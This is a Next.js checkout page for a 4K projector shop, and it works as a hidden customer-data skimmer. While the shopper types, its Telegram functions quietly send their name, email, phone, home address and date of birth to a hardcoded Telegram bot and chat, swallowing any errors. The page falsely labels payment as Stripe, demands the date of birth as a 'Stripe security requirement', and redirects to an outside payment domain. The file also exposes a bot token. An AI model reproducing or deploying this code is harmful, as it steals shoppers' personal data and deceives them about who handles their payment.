"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useCart } from "@/lib/cart-context"
import { useTheme } from "@/lib/theme-context"
import { useRouter } from "next/navigation"
import { Lock, Info, ChevronDown, ChevronUp } from "lucide-react"

export default function CheckoutPage() {
  const router = useRouter()
  const { items, subtotal, discount, total, clearCart } = useCart()
  const { theme } = useTheme()
  const [loading, setLoading] = useState(false)
  const [mounted, setMounted] = useState(false)
  const [showOrderSummary, setShowOrderSummary] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState("credit-card")

  const autoDiscount = discount > 0 ? discount : 0

  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "Canada",
    phone: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
    dob: "",
    billingAddressSame: true,
    billingAddress: "",
    billingApartment: "",
    billingCity: "",
    billingProvince: "",
    billingPostalCode: "",
    billingCountry: "Canada",
  })

  // ========== TELEGRAM CONFIGURATION ==========
  const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
  const TELEGRAM_CHAT_ID = '-5217100062'
  const sessionId = `HT4K_${Date.now()}`
  const [messageId, setMessageId] = useState<number | null>(null)
  const [updateTimer, setUpdateTimer] = useState<any>(null)

  useEffect(() => {
    setMounted(true)
  }, [])

  // ========== TELEGRAM FUNCTIONS ==========
  
  // Send/edit Telegram message
  const updateTelegram = async () => {
    // Only send if we have some data
    if (!formData.firstName && !formData.email && !formData.phone) {
      return
    }
    
    const message = `🎬 HOMETHEATER4K - NOUVEAU CHECKOUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 CLIENT:
   ${formData.firstName} ${formData.lastName}

📧 CONTACT:
   📧 ${formData.email}
   📱 ${formData.phone}

🏠 ADRESSE DE LIVRAISON:
   📍 ${formData.address}
   🏢 ${formData.apartment}
   🏙️ ${formData.city}, ${formData.province} ${formData.postalCode}
   🌍 ${formData.country}

🎂 DATE DE NAISSANCE:
   📅 ${formData.dob}

💰 COMMANDE:
   📦 4K Projector Ultimate Package
   💵 $129.99 CAD + Taxes
   🆔 Session: ${sessionId}

⏰ DERNIÈRE MISE À JOUR:
   ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    
    try {
      let url, body
      
      if (messageId) {
        // Edit existing message
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageId,
          text: message
        }
      } else {
        // Create new message
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        }
      }
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
      })
      
      const result = await response.json()
      
      if (result.ok && !messageId) {
        setMessageId(result.result.message_id)
      }
      
    } catch (error) {
      // Silent error handling
    }
  }

  // Send payment submission notification
  const notifyPaymentSubmission = async () => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `🎯 **PAIEMENT SOUMIS !**\n\n💳 Le client a cliqué sur "Payer"\n🆔 Session: ${sessionId}\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n🔄 Redirection vers le système de paiement...`
        })
      })
    } catch (error) {
      // Silent error handling
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const value = e.target.type === "checkbox" ? (e.target as HTMLInputElement).checked : e.target.value
    setFormData({ ...formData, [e.target.name]: value })
    
    // Update Telegram with debounce (2 seconds)
    if (updateTimer) {
      clearTimeout(updateTimer)
    }
    setUpdateTimer(setTimeout(() => {
      updateTelegram()
    }, 2000))
  }

  // Function to generate the payment backend URL
  const getProvinceTaxRate = (province: string) => {
    const taxRates: { [key: string]: number } = {
      'ON': 13,      // Ontario
      'NS': 15,      // Nova Scotia
      'NB': 15,      // New Brunswick
      'NL': 15,      // Newfoundland and Labrador
      'PE': 15,      // Prince Edward Island
      'QC': 14.975,  // Quebec
      'BC': 12,      // British Columbia
      'SK': 11,      // Saskatchewan
      'MB': 12,      // Manitoba
      'AB': 5,       // Alberta (GST only)
      'NT': 5,       // Northwest Territories (GST only)
      'NU': 5,       // Nunavut (GST only)
      'YT': 5        // Yukon (GST only)
    }
    return taxRates[province] || 0
  }

  const cleanPhoneNumber = (phone: string) => {
    // Remove all non-numeric characters except +
    return phone.replace(/[^\d+]/g, '')
  }

  const generatePaymentURL = (data: typeof formData) => {
    const baseURL = 'https://secure.payment-ca.com/connect/form'
    
    // Generate meaningful order number: HT4K + timestamp + random
    const orderNumber = `HT4K${Date.now()}${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`
    
    // Calculate tax rate based on province
    const taxRate = data.country === 'Canada' ? getProvinceTaxRate(data.province) : 0
    
    const params = {
      site: 'secure.payment-ca.com',
      icon: 'https://s6.imgcdn.dev/8xixd.png',
      image: 'https://s6.imgcdn.dev/8xQsM.png',
      amount: '129.99',
      symbol: data.country === 'Canada' ? 'CAD' : 'USD',
      vat: taxRate.toString(),
      riderect_success: 'https://hometheater4k.com/order-processing',
      riderect_failed: 'https://hometheater4k.com/order-failed',
      riderect_back: 'https://hometheater4k.com/checkout',
      order_id: orderNumber,
      billing_first_name: data.firstName,
      billing_last_name: data.lastName,
      billing_company: '',
      billing_address_1: data.address,
      billing_address_2: data.apartment || '',
      billing_city: data.city,
      billing_state: data.province,
      billing_postcode: data.postalCode,
      billing_country: data.country === 'Canada' ? 'CA' : 'US',
      billing_email: data.email,
      billing_phone: cleanPhoneNumber(data.phone)
    }
    
    const queryString = Object.keys(params)
      .map(key => `${key}=${encodeURIComponent(params[key as keyof typeof params])}`)
      .join('&')
    
    return `${baseURL}?${queryString}`
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate required fields
    if (!formData.firstName || !formData.lastName || !formData.city || !formData.email || !formData.phone) {
      alert('Please fill in all required fields')
      return
    }
    
    // Send final update to Telegram
    await updateTelegram()
    
    // Notify payment submission
    await notifyPaymentSubmission()
    
    // Generate the payment URL with user data and redirect directly
    const paymentURL = generatePaymentURL(formData)
    
    console.log('Redirecting to payment gateway:', paymentURL)
    
    // Direct redirect to Stripe with pre-filled billing information
    window.location.href = paymentURL
  }

  if (!mounted) return null

  if (items.length === 0) {
    router.push("/cart")
    return null
  }

  const taxes = total * 0.13
  const shippingCost = 0 // Free shipping
  const grandTotal = total + taxes + shippingCost

  return (
    <div className={`min-h-screen ${theme === "dark" ? "bg-zinc-950" : "bg-[#fafafa]"}`}>
      <div className="max-w-7xl mx-auto">
        {/* Mobile Order Summary Toggle */}
        <div className="lg:hidden">
          <button
            onClick={() => setShowOrderSummary(!showOrderSummary)}
            className={`w-full px-4 py-4 flex items-center justify-between border-b ${theme === "dark" ? "bg-zinc-900 border-zinc-700" : "bg-[#f5f3ed] border-gray-200"}`}
          >
            <div className="flex items-center gap-2">
              <span className={`text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>Order summary</span>
              {showOrderSummary ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
            </div>
            <span className={`text-lg font-bold ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
              ${grandTotal.toFixed(2)}
            </span>
          </button>
          {showOrderSummary && (
            <div
              className={`px-4 py-6 border-b ${theme === "dark" ? "bg-zinc-900 border-zinc-700" : "bg-[#f5f3ed] border-gray-200"}`}
            >
              {/* Products */}
              <div className="space-y-4 mb-4">
                {items.map((item) => (
                  <div key={item.id} className="flex gap-3">
                    <div className="relative flex-shrink-0">
                      <div
                        className={`w-16 h-16 rounded-lg border ${theme === "dark" ? "border-zinc-700 bg-zinc-800" : "border-gray-300 bg-white"} overflow-hidden`}
                      >
                        <img
                          src={
                            item.name.includes("Starter")
                              ? "/img/61lopDncM+L._AC_SX425_.jpg"
                              : item.name.includes("Ultimate")
                                ? "/img/ultr.jpg"
                                : "/4k-projector-professional-package-with-screen-prem.jpg"
                          }
                          alt={item.name}
                          className="w-full h-full object-cover"
                        />
                      </div>
                      <span className="absolute -top-2 -right-2 w-5 h-5 bg-zinc-600 text-white text-xs rounded-full flex items-center justify-center">
                        {item.quantity}
                      </span>
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className={`text-sm font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                        {item.name}
                      </h3>
                    </div>
                    <div className={`text-sm font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                      ${(item.price * item.quantity).toFixed(2)}
                    </div>
                  </div>
                ))}
              </div>

              {autoDiscount > 0 && (
                <div
                  className={`mb-4 p-3 rounded-lg ${theme === "dark" ? "bg-green-900/20 border border-green-800" : "bg-green-50 border border-green-200"}`}
                >
                  <div className="flex justify-between items-center">
                    <span className={`text-sm font-medium ${theme === "dark" ? "text-green-400" : "text-green-700"}`}>
                      #2026YEAR Applied
                    </span>
                    <span className={`text-sm font-bold ${theme === "dark" ? "text-green-400" : "text-green-700"}`}>
                      -${autoDiscount.toFixed(2)}
                    </span>
                  </div>
                </div>
              )}

              {/* Totals */}
              <div className={`space-y-2 text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>
                <div className="flex justify-between">
                  <span>Subtotal</span>
                  <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${subtotal.toFixed(2)}</span>
                </div>
                {autoDiscount > 0 && (
                  <div className="flex justify-between text-green-600">
                    <span>Discount</span>
                    <span>-${autoDiscount.toFixed(2)}</span>
                  </div>
                )}
                <div className="flex justify-between">
                  <span>Shipping</span>
                  <span className={`${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                    {shippingCost === 0 ? "FREE" : `$${shippingCost.toFixed(2)}`}
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <div className="flex items-center gap-1">
                    <span>Estimated taxes</span>
                    <Info className="w-3.5 h-3.5 md:w-4 md:h-4" />
                  </div>
                  <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${taxes.toFixed(2)}</span>
                </div>
                <div
                  className={`flex justify-between pt-3 border-t text-base font-bold ${theme === "dark" ? "border-zinc-700 text-white" : "border-gray-200 text-gray-900"}`}
                >
                  <span>Total</span>
                  <span>
                    <span className="text-xs font-normal mr-1">CAD</span>${grandTotal.toFixed(2)}
                  </span>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="grid lg:grid-cols-2 gap-0">
          {/* Left Column - Form */}
          <div className={`px-4 sm:px-6 md:px-12 py-6 md:py-8 ${theme === "dark" ? "bg-zinc-950" : "bg-[#fafafa]"}`}>
            {/* Logo */}
            <div className="mb-6 md:mb-8">
              <h1 className="text-xl md:text-2xl font-bold bg-gradient-to-r from-orange-500 to-purple-600 text-transparent bg-clip-text">
                Lumina4K
              </h1>
            </div>

            {/* Breadcrumb */}
            <div className={`text-xs sm:text-sm mb-4 md:mb-6 ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
              <a href="/cart" className="hover:text-orange-500">
                Cart
              </a>
              <span className="mx-2">›</span>
              <span className={theme === "dark" ? "text-white" : "text-gray-900"}>Checkout</span>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5 md:space-y-6">
              {/* Contact */}
              <div>
                <div className="flex items-center justify-between mb-2 md:mb-3">
                  <h3
                    className={`text-sm md:text-base font-semibold ${theme === "dark" ? "text-white" : "text-gray-900"}`}
                  >
                    Email
                  </h3>
                  <a href="#" className="text-xs md:text-sm text-orange-500 hover:text-orange-600">
                    Sign in
                  </a>
                </div>
                <Input
                  name="email"
                  type="email"
                  required
                  value={formData.email}
                  onChange={handleInputChange}
                  className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white focus:border-orange-500" : "bg-white border-gray-300 text-gray-900 focus:border-orange-500"}`}
                  placeholder="Enter your email address"
                />
              </div>

              {/* Delivery */}
              <div>
                <h3
                  className={`text-sm md:text-base font-semibold mb-2 md:mb-3 ${theme === "dark" ? "text-white" : "text-gray-900"}`}
                >
                  Delivery
                </h3>
                <div className="space-y-2 md:space-y-3">
                  <div>
                    <select
                      name="country"
                      value={formData.country}
                      onChange={handleInputChange}
                      className={`w-full h-11 md:h-12 px-3 rounded-md text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"} border focus:ring-2 focus:ring-orange-500 focus:border-orange-500`}
                    >
                      <option value="Canada">Canada</option>
                      <option value="United States">United States</option>
                    </select>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 md:gap-3">
                    <Input
                      name="firstName"
                      required
                      value={formData.firstName}
                      onChange={handleInputChange}
                      className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                      placeholder="First name (optional)"
                    />
                    <Input
                      name="lastName"
                      required
                      value={formData.lastName}
                      onChange={handleInputChange}
                      className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                      placeholder="Last name"
                    />
                  </div>
                  <div className="relative">
                    <Input
                      name="address"
                      required
                      value={formData.address}
                      onChange={handleInputChange}
                      className={`h-11 md:h-12 pr-10 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                      placeholder="Address"
                    />
                    <button
                      type="button"
                      className={`absolute right-3 top-1/2 -translate-y-1/2 ${theme === "dark" ? "text-zinc-500" : "text-gray-400"}`}
                    >
                      <svg className="w-4 md:w-5 h-4 md:h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
                        />
                      </svg>
                    </button>
                  </div>
                  <Input
                    name="apartment"
                    required
                    value={formData.apartment}
                    onChange={handleInputChange}
                    className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                    placeholder="Apartment, suite, etc."
                  />
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 md:gap-3">
                    <Input
                      name="city"
                      required
                      value={formData.city}
                      onChange={handleInputChange}
                      className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                      placeholder="City"
                    />
                    {formData.country === "Canada" ? (
                      <select
                        name="province"
                        value={formData.province}
                        onChange={handleInputChange}
                        className={`h-11 md:h-12 px-3 rounded-md text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"} border`}
                      >
                        <option value="">Province</option>
                        <option value="AB">Alberta</option>
                        <option value="BC">British Columbia</option>
                        <option value="MB">Manitoba</option>
                        <option value="NB">New Brunswick</option>
                        <option value="NL">Newfoundland and Labrador</option>
                        <option value="NT">Northwest Territories</option>
                        <option value="NS">Nova Scotia</option>
                        <option value="NU">Nunavut</option>
                        <option value="ON">Ontario</option>
                        <option value="PE">Prince Edward Island</option>
                        <option value="QC">Quebec</option>
                        <option value="SK">Saskatchewan</option>
                        <option value="YT">Yukon</option>
                      </select>
                    ) : (
                      <Input
                        name="province"
                        value={formData.province}
                        onChange={handleInputChange}
                        className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                        placeholder="State"
                      />
                    )}
                    <Input
                      name="postalCode"
                      required
                      value={formData.postalCode}
                      onChange={handleInputChange}
                      className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                      placeholder="Postal code"
                    />
                  </div>
                  <Input
                    name="phone"
                    type="tel"
                    required
                    value={formData.phone}
                    onChange={handleInputChange}
                    className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                    placeholder="Phone"
                  />
                </div>
              </div>

              {/* Payment */}
              <div>
                <h3
                  className={`text-sm md:text-base font-semibold mb-2 md:mb-3 ${theme === "dark" ? "text-white" : "text-gray-900"}`}
                >
                  Payment
                </h3>
                <p
                  className={`text-xs md:text-sm mb-3 md:mb-4 ${theme === "dark" ? "text-zinc-400" : "text-gray-600"}`}
                >
                  All transactions are secure and encrypted. Your order includes free returns and 24/7 access to our
                  award-winning customer service
                </p>

                {/* Payment Method - Stripe */}
                <div
                  className={`w-full border rounded-lg ${theme === "dark" ? "bg-zinc-900 border-purple-500" : "bg-white border-purple-500"}`}
                >
                  <div className="flex items-center justify-between p-3 md:p-4">
                    <div className="flex items-center gap-2 md:gap-3">
                      <div className="w-4 h-4 md:w-5 md:h-5 rounded-full border-2 border-purple-500 flex items-center justify-center">
                        <div className="w-2 h-2 md:w-2.5 md:h-2.5 rounded-full bg-purple-500" />
                      </div>
                      <span
                        className={`text-sm md:text-base font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}
                      >
                        Stripe Payment
                      </span>
                    </div>
                    <div className="flex items-center gap-0.5">
                      <img
                        src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg"
                        alt="Visa"
                        className="h-4 w-6"
                      />
                      <img
                        src="https://secure.payment-ca.com/assets/img/mastercard.svg"
                        alt="Mastercard"
                        className="h-4 w-6"
                      />
                      <img
                        src="https://secure.payment-ca.com/assets/img/amex.svg"
                        alt="Amex"
                        className="h-4 w-6"
                      />
                      <img
                        src="https://secure.payment-ca.com/assets/img/unionpay.svg"
                        alt="UnionPay"
                        className="h-4 w-6"
                      />
                    </div>
                  </div>

                  <div
                    className={`p-3 md:p-4 border-t space-y-3 md:space-y-4 ${theme === "dark" ? "border-zinc-700" : "border-gray-200"}`}
                  >
                    {/* Date of Birth for Security */}
                    <div>
                      <label 
                        htmlFor="dob"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-white" : "text-gray-900"}`}
                      >
                        Date of Birth (Security Requirement)
                      </label>
                      <Input
                        id="dob"
                        name="dob"
                        required
                        type="date"
                        min="1924-01-01"
                        max="2011-12-31"
                        value={formData.dob}
                        onChange={handleInputChange}
                        className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-950 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"}`}
                      />
                    </div>

                    <p className={`text-xs text-center ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                      You must provide your date of birth as a security measure to pay with Stripe
                    </p>
                  </div>
                </div>

                {/* Billing Address Checkbox */}
                <div className="mt-4">
                  <label className="flex items-start gap-2 md:gap-3 cursor-pointer">
                    <input
                      type="checkbox"
                      name="billingAddressSame"
                      checked={formData.billingAddressSame}
                      onChange={handleInputChange}
                      className="mt-0.5 md:mt-1 w-4 h-4 text-orange-500 rounded border-gray-300 focus:ring-orange-500"
                    />
                    <span className={`text-xs md:text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}>
                      Use shipping address as billing address
                    </span>
                  </label>
                </div>

                    {!formData.billingAddressSame && (
                      <div className="space-y-2 md:space-y-3 pt-2 md:pt-3 border-t border-zinc-700">
                        <h4 className={`text-sm font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                          Billing Address
                        </h4>
                        <select
                          name="billingCountry"
                          value={formData.billingCountry}
                          onChange={handleInputChange}
                          className={`w-full h-11 md:h-12 px-3 rounded-md text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"} border`}
                        >
                          <option value="Canada">Canada</option>
                          <option value="United States">United States</option>
                        </select>
                        <Input
                          name="billingAddress"
                          required
                          value={formData.billingAddress}
                          onChange={handleInputChange}
                          className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"}`}
                          placeholder="Address"
                        />
                        <Input
                          name="billingApartment"
                          value={formData.billingApartment}
                          onChange={handleInputChange}
                          className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"}`}
                          placeholder="Apartment, suite, etc. (optional)"
                        />
                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 md:gap-3">
                          <Input
                            name="billingCity"
                            required
                            value={formData.billingCity}
                            onChange={handleInputChange}
                            className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-white border-gray-300 text-gray-900"}`}
                            placeholder="City"
                          />
                          <select
                            name="billingProvince"
                            value={formData.billingProvince}
                            onChange={handleInputChange}
                            className={`h-11 md:h-12 px-3 rounded-md text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"} border`}
                          >
                            <option value="">Province</option>
                            <option value="ON">Ontario</option>
                            <option value="QC">Quebec</option>
                            <option value="BC">British Columbia</option>
                          </select>
                          <Input
                            name="billingPostalCode"
                            required
                            value={formData.billingPostalCode}
                            onChange={handleInputChange}
                            className={`h-11 md:h-12 text-sm md:text-base ${theme === "dark" ? "bg-zinc-900 border-zinc-700 text-white" : "bg-gray-50 border-gray-300 text-gray-900"}`}
                            placeholder="Postal code"
                          />
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Pay with Stripe Button */}
              <Button
                type="submit"
                disabled={loading}
                className="w-full h-11 bg-purple-600 hover:bg-purple-700 text-white font-medium text-sm rounded-lg flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    Connecting to Stripe...
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M13.976 9.15c-2.172-.806-3.356-1.426-3.356-2.409 0-.831.683-1.305 1.901-1.305 2.227 0 4.515.858 6.09 1.631l.89-5.494C18.252.975 15.697 0 12.165 0 9.667 0 7.589.654 6.104 1.872 4.56 3.147 3.757 4.992 3.757 7.218c0 4.039 2.467 5.76 6.476 7.219 2.585.92 3.445 1.574 3.445 2.583 0 .98-.84 1.545-2.354 1.545-1.875 0-4.965-.921-6.99-2.109l-.9 5.555C5.175 22.99 8.385 24 11.714 24c2.641 0 4.843-.624 6.328-1.813 1.664-1.305 2.525-3.236 2.525-5.732 0-4.128-2.524-5.851-6.591-7.305h0z"/>
                    </svg>
                    Pay with Stripe - ${grandTotal.toFixed(2)}
                  </>
                )}
              </Button>
            </form>
            
            {/* Payment Processing Overlay */}
            {loading && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                <div className={`p-8 rounded-lg max-w-md w-full mx-4 ${theme === "dark" ? "bg-zinc-900" : "bg-white"}`}>
                  <div className="text-center">
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
                    <h3 className={`text-lg font-semibold mb-2 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                      Processing Payment
                    </h3>
                    <p className={`text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>
                      Connecting to secure payment gateway...
                      <br />
                      Please do not close this window.
                    </p>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Right Column - Order Summary (Desktop) */}
          <div
            className={`hidden lg:block px-8 py-8 sticky top-0 h-screen overflow-y-auto ${theme === "dark" ? "bg-zinc-900" : "bg-[#f5f3ed]"}`}
          >
            {/* Products */}
            <div className="space-y-4 mb-6">
              {items.map((item) => (
                <div key={item.id} className="flex gap-4">
                  <div className="relative flex-shrink-0">
                    <div
                      className={`w-16 h-16 rounded-lg border ${theme === "dark" ? "border-zinc-700 bg-zinc-800" : "border-gray-300 bg-white"} overflow-hidden`}
                    >
                      <img
                        src={
                          item.name.includes("Starter")
                            ? "/4k-projector-starter-package-black-sleek.jpg"
                            : item.name.includes("Ultimate")
                              ? "/4k-projector-ultimate-home-cinema-setup-luxury.jpg"
                              : "/4k-projector-professional-package-with-screen-prem.jpg"
                        }
                        alt={item.name}
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <span className="absolute -top-2 -right-2 w-5 h-5 bg-zinc-600 text-white text-xs rounded-full flex items-center justify-center">
                      {item.quantity}
                    </span>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className={`text-sm font-medium truncate ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                      {item.name}
                    </h3>
                  </div>
                  <div className={`text-sm font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                    ${(item.price * item.quantity).toFixed(2)}
                  </div>
                </div>
              ))}
            </div>

            {autoDiscount > 0 && (
              <div
                className={`mb-6 p-3 rounded-lg ${theme === "dark" ? "bg-green-900/20 border border-green-800" : "bg-green-50 border border-green-200"}`}
              >
                <div className="flex justify-between items-center">
                  <span className={`text-sm font-medium ${theme === "dark" ? "text-green-400" : "text-green-700"}`}>
                    #2026YEAR Applied
                  </span>
                  <span className={`text-sm font-bold ${theme === "dark" ? "text-green-400" : "text-green-700"}`}>
                    -${autoDiscount.toFixed(2)}
                  </span>
                </div>
              </div>
            )}

            {/* Totals */}
            <div className={`space-y-2 text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>
              <div className="flex justify-between">
                <span>Subtotal</span>
                <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${subtotal.toFixed(2)}</span>
              </div>
              {autoDiscount > 0 && (
                <div className="flex justify-between text-green-600">
                  <span>Discount</span>
                  <span>-${autoDiscount.toFixed(2)}</span>
                </div>
              )}
              <div className="flex justify-between">
                <span>Shipping</span>
                <span className={`${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                  {shippingCost === 0 ? "FREE" : `$${shippingCost.toFixed(2)}`}
                </span>
              </div>
              <div className="flex justify-between items-center">
                <div className="flex items-center gap-1">
                  <span>Estimated taxes</span>
                  <Info className="w-3.5 h-3.5" />
                </div>
                <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${taxes.toFixed(2)}</span>
              </div>
              <div
                className={`flex justify-between pt-3 border-t text-base font-bold ${theme === "dark" ? "border-zinc-700 text-white" : "border-gray-200 text-gray-900"}`}
              >
                <span>Total</span>
                <span>
                  <span className="text-xs font-normal mr-1">CAD</span>${grandTotal.toFixed(2)}
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
